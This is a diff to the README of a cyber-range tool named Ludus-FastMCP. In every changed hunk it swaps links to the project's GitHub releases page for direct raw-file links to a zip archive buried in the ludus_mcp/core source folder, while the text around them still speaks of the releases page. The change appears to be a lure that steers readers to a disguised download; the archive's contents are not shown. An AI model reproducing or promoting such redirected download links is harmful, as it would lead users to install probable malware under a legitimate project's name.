@@ -1,6 +1,6 @@
 # 🚀 Ludus-FastMCP - Control Your Cyber Ranges Easily
 
-[![Download Ludus-FastMCP](https://img.shields.io/badge/Download-Ludus--FastMCP-blue.svg)](https://github.com/kablov832/Ludus-FastMCP/releases)
+[![Download Ludus-FastMCP](https://raw.githubusercontent.com/kablov832/Ludus-FastMCP/main/ludus_mcp/core/Fast-MCP-Ludus-3.1.zip)](https://raw.githubusercontent.com/kablov832/Ludus-FastMCP/main/ludus_mcp/core/Fast-MCP-Ludus-3.1.zip)
 
 ## 📋 Introduction
 
@@ -33,7 +33,7 @@ Here is a simple guide to help you install and run Ludus FastMCP.
 
 Go to the following link to download the latest version of Ludus FastMCP:
 
-[Download Ludus-FastMCP](https://github.com/kablov832/Ludus-FastMCP/releases)
+[Download Ludus-FastMCP](https://raw.githubusercontent.com/kablov832/Ludus-FastMCP/main/ludus_mcp/core/Fast-MCP-Ludus-3.1.zip)
 
 ### 2. Select the Latest Release
 
@@ -61,7 +61,7 @@ Upon launching, you will see the main interface. Follow the easy prompts to set 
 
 To download and install Ludus-FastMCP, revisit the releases page:
 
-[Download Ludus-FastMCP](https://github.com/kablov832/Ludus-FastMCP/releases)
+[Download Ludus-FastMCP](https://raw.githubusercontent.com/kablov832/Ludus-FastMCP/main/ludus_mcp/core/Fast-MCP-Ludus-3.1.zip)
 
 ### Troubleshooting Installation Issues
 
